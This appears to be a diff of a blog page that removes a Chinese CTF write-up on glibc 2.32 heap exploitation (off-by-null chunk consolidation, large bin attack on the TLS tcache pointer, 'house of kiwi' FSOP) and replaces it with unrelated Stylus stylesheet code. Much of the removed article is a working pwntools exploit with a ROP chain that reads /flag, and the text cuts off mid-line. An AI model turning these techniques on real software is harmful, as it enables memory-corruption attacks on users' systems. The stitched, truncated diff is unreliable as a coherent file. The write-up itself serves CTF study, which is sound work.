@@ -145,285 +145,198 @@
             <div class="main-content">
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    $avatarWidth = 46px;
+$arrow-icon-width = 16px;
+$post-nav-max-width = 220px;
+$article-title-font-size = 1.6rem;
 
-        <div class="article-title">
-            <span class="title-hover-animation">glibc2.32的堆风水+house of kiwi实例</span>
-        </div>
+.article-content-container {
 
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ai.jpg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2022-05-13 21:12:41
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/pwn/">pwn</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/HeapFengShui/">HeapFengShui</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/house-of-%E7%B3%BB%E5%88%97/">house of 系列</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+  keep-container(false, 0, 0, 30px, 30px);
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>2.3k 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>10 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
-</div>
+  .article-title {
+    color: var(--second-text-color);
+    font-weight: 600;
+    font-size: $article-title-font-size;
 
-                    </div>
-                </div>
-            </div>
-        
+    +keep-tablet() {
+      font-size: $article-title-font-size * 0.9;
+    }
 
-        <div class="article-content markdown-body">
-            <p>看我前面的文章可以发现我在做漏洞利用的总结主要是在glibc2.31以下版本的，这也就导致了在后续版本的glibc的利用方式我也没怎么掌握，后续打算将house of kiwi以及house of Emma写完之后会关注一下glibc2.31之后的how2heap的poc，如果存在差异就会写文章记录。</p>
-<p>在学校的一次比赛当中我出了一道题，是glibc2.23版本的，当时的解题关键就是off by null进行多个堆合并，利用方式较为简单。但是就目前的glibc2.32中consolidate的条件是比较苛刻的，因此出现了新的堆风水的方式了(这篇文章也是把以前的坑填了)。</p>
-<h2 id="隔块堆合并手法"><a href="#隔块堆合并手法" class="headerlink" title="隔块堆合并手法"></a>隔块堆合并手法</h2><p>首先还是先看源码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到这里是验证了p位，如果为0那么就检测前一个chunk的size是否等于当前chunk的size，那么就不能单纯的像以前那样利用了，我们还需要伪造前一个chunk的size了，这里需要用到large bin的机制了。</p>
-<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>既然我们只能进行off by null还需要堆合并，那我们就需要满足上面代码的两项要求，第一就是常规的chunk-&gt;fd-&gt;bk指向本身，其次就是size==prev_size</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220512205902066.png"
-                      alt="image-20220512205902066"
-                ></p>
-<p>此时取出size:0x510，由于残留指针，所以还是存在以下的指向关系</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220513100743528.png"
-                      alt="image-20220513100743528"
-                ></p>
-<p>并且此时在fd，bk位置伪造prev_size和size，那么我们在下面off by null的时候计算出prev_size即可绕过对于size的检查了。但是此时又出现了一个问题，fake_chunk的fd的bk以及fake_chunk的bk的fd并不指向它本身。那么现在取出size:0x500的chunk，直接覆盖掉其fd指针，使他指向size:0x510，然后large bin当中只剩下一个size:0x520，它的fd和bk都指向了large bin了，所以我们此时需要再free一个size为0x500的chunk，然后把size:0x520取出来进行覆盖，那么即可绕过consolidate时的验证了。</p>
-<h2 id="NULL-FXCK"><a href="#NULL-FXCK" class="headerlink" title="NULL_FXCK"></a>NULL_FXCK</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p>这道题同样是菜单题，但是不同的是在每次选择的时候会验证__malloc_hook和__free_hook以及会清除掉tcache的count。</p>
-<p>然后唯一的漏洞点是modify函数，存在一个off by null但是只能执行一次。并且在delete函数会清空指针。</p>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因为只有一次off by null的机会，所以我们能够利用的方式就是上面的堆合并技巧，但是这里的create函数在写入数据的时候总是会把结尾改为\x00并且最小的chunk为0x110所以我们无法直接覆盖内容了，需要利用partial overwrite并且这里的partial overwrite还需要注意一下。我们需要让size:0x510的chunk的地址形式为：0xAAAAAAAAAAAA00AA</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220513130004125.png"
-                      alt="image-20220513130004125"
-                ></p>
-<p>形成这样的堆叠，接着申请回来并覆盖值</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220513130252713.png"
-                      alt="image-20220513130252713"
-                ></p>
-<p>当然这里由于partial overwrite的缘故第一位是否为0是需要一定概率的(上面的0x1000是因为我还没有计算大小，后续会调整)。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220513130638823.png"
-                      alt="image-20220513130638823"
-                ></p>
-<p>可以看到这里就实现了consolidate。</p>
-<p>下面就是泄漏地址了，首先先泄漏堆地址，因为泄漏起来较为简单，在我们consolidate之前我们所显示的堆地址都是以\x00结尾导致无法泄漏，但是在consolidate之后存在以下代码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unlink_chunk (mstate av, mchunkptr p)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  ... ...</span><br></pre></td></tr></table></figure>
-
-<p>导致堆地址写在了其他索引的chunk当中，所以可以非常轻松的泄漏出来，不过这里的main_arena+96非常恶心，结尾是\x00有因为是strlen计算大小打印就导致泄漏不出来，但是这里使用的方法可以继续延续在unsorted bin当中的思路进行切割，但是下一步就是申请大chunk将我们consolidate的chunk放到largin bin当中。</p>
-<p>后面也就是实现任意地址写了，首先想到的肯定就是tcache，虽然题目看起来是没有办法对tcache进行攻击的但是tcache这个结构体也只是因为tls结构存放的指针才起的作用，所以我们可以通过large bin attack来修改tls结构当中的指针，然后在堆块中布置好地址，最后修改地址进行fsop。这里采取的方式就是以前写过的<a href="https://cv196082.gitee.io/2022/03/11/house-of-corrosion-husk-kiwi/">house of kiwi</a>不过以前写的比较匆忙也没有加以实践，可能看起来就会晕头晕脑的，所以这里还是从源码层面分析一边接着放出exp应该会好点。</p>
-<h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>先来说一下为什么不能用house of系列中的其他方式，因为这道题的退出函数是_exit然而其他的要求是exit退出或者正常main退出，所以这里只能寻找其他攻击链。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__malloc_assert (<span class="keyword">const</span> <span class="keyword">char</span> *assertion, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> line,</span><br><span class="line">		 <span class="keyword">const</span> <span class="keyword">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="keyword">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>当assert触发时会调用这一函数，中间调用了fflush</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_fflush (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> result;</span><br><span class="line">      CHECK_FILE (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220513173015804.png"
-                      alt="image-20220513173015804"
-                ></p>
-<p>通过调试也可以看到调用关系</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220513173151430.png"
-                      alt="image-20220513173151430"
-                ></p>
-<p>并且这里是可读可写的，所以后续就好办了。</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.32.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, content=<span class="literal">None</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;(: Size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        r.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># r = process(&#x27;./main&#x27;)</span></span><br><span class="line">        create(<span class="number">0x2000</span>)</span><br><span class="line">        create(<span class="number">0x2000</span>)</span><br><span class="line">        create(<span class="number">0xd20</span>)</span><br><span class="line">        create(<span class="number">0x500</span>)  <span class="comment">#3</span></span><br><span class="line">        create(<span class="number">0x4f0</span>)  <span class="comment">#4</span></span><br><span class="line">        create(<span class="number">0x4f0</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line">        create(<span class="number">0x510</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line">        create(<span class="number">0x500</span>)</span><br><span class="line">        create(<span class="number">0x108</span>)  <span class="comment">#10</span></span><br><span class="line">        create(<span class="number">0x4f0</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        create(<span class="number">0x1000</span>)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        delete(<span class="number">5</span>)</span><br><span class="line">        create(<span class="number">0x1000</span>)</span><br><span class="line">        delete(<span class="number">5</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        create(<span class="number">0x1000</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        create(<span class="number">0x500</span>, flat(<span class="number">0</span>, <span class="number">0x1c60</span> + <span class="number">1</span>))  <span class="comment">#3</span></span><br><span class="line">        create(<span class="number">0x4f0</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x10\n&#x27;</span>)  <span class="comment">#5</span></span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        create(<span class="number">0x1000</span>)</span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        create(<span class="number">0x510</span>, <span class="string">b&#x27;\x10\n&#x27;</span>)  <span class="comment">#4</span></span><br><span class="line">        create(<span class="number">0x4f0</span>)  <span class="comment">#7---4</span></span><br><span class="line">        edit(<span class="number">10</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x100</span> + p64(<span class="number">0x1c60</span>))</span><br><span class="line">        delete(<span class="number">11</span>)</span><br><span class="line">        show(<span class="number">4</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        heap_base = u64(</span><br><span class="line">            r.recvuntil(<span class="string">b&#x27;1. Create&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x5a10</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">        create(<span class="number">0x4f0</span>)  <span class="comment">#11</span></span><br><span class="line">        create(<span class="number">0x2000</span>)  <span class="comment">#13</span></span><br><span class="line">        delete(<span class="number">13</span>)</span><br><span class="line">        show(<span class="number">7</span>)</span><br><span class="line">        libc_base = u64(</span><br><span class="line">            r.recvuntil(<span class="string">b&#x27;1. Create&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e4280</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">        tls_tcache = libc_base + <span class="number">0x1eb578</span></span><br><span class="line">        _IO_file_jumps_addr = libc_base + <span class="number">0x1e54c0</span></span><br><span class="line">        _IO_file_jumps_SYNC_addr = _IO_file_jumps_addr + <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">        fake_tcache = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x7C</span> - <span class="number">0x10</span>)</span><br><span class="line">        fake_tcache += p16(<span class="number">1</span>)</span><br><span class="line">        fake_tcache += p16(<span class="number">1</span>)</span><br><span class="line">        fake_tcache = fake_tcache.ljust(<span class="number">0x270</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">        fake_tcache += p64(_IO_file_jumps_SYNC_addr)</span><br><span class="line">        fake_tcache += p64(libc_base + <span class="number">0x1e48c0</span>)</span><br><span class="line"></span><br><span class="line">        payload = fake_tcache</span><br><span class="line">        create(<span class="number">0x4f0</span>, payload)  <span class="comment">#13</span></span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        create(<span class="number">0x2000</span>)</span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x600</span> + flat(<span class="number">0</span>, <span class="number">0x521</span>, libc_base + <span class="number">0x1e4030</span>, libc_base</span><br><span class="line">                                      + <span class="number">0x1e4030</span>, <span class="number">0</span>, tls_tcache - <span class="number">0x20</span>)</span><br><span class="line">        create(<span class="number">0x600</span> + <span class="number">0x30</span>, payload)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        create(<span class="number">0x2000</span>)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        create(<span class="number">0x4f0</span>, fake_tcache)</span><br><span class="line"></span><br><span class="line">        pop_rdi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))</span><br><span class="line">        pop_rsi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>)))</span><br><span class="line">        pop_rdx = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>)))</span><br><span class="line">        pop_rax = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rax\nret&#x27;</span>)))</span><br><span class="line">        syscall = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall\nret&#x27;</span>)))</span><br><span class="line">        ret = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;ret&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">        heap_addr = heap_base + <span class="number">0x7298</span></span><br><span class="line">        payload = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">        payload += flat(pop_rdi, heap_addr - <span class="number">0x8</span>, pop_rsi, <span class="number">0</span>, pop_rdx, <span class="number">0</span>,</span><br><span class="line">                        pop_rax, <span class="number">2</span>, syscall)</span><br><span class="line">        payload += flat(pop_rdi, <span class="number">3</span>, pop_rsi, libc_base + libc.bss(), pop_rdx,</span><br><span class="line">                        <span class="number">0x100</span>, pop_rax, <span class="number">0</span>, syscall)</span><br><span class="line">        payload += flat(pop_rdi, <span class="number">1</span>, pop_rsi, libc_base + libc.bss(), pop_rdx,</span><br><span class="line">                        <span class="number">0x100</span>, pop_rax, <span class="number">1</span>, syscall)</span><br><span class="line">        create(<span class="number">0x1200</span>, payload)</span><br><span class="line"></span><br><span class="line">        create(<span class="number">0x590</span>, fake_tcache[<span class="number">48</span>:])</span><br><span 